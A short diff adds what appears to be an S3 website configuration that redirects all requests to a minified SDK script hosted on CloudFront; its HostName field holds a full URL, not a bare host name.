@@ -1,0 +1,5 @@
+{
+    "RedirectAllRequestsTo": {
+        "HostName": "https://doypq9et62aku.cloudfront.net/sdk/19/sdk.min.js"
+    }
+}
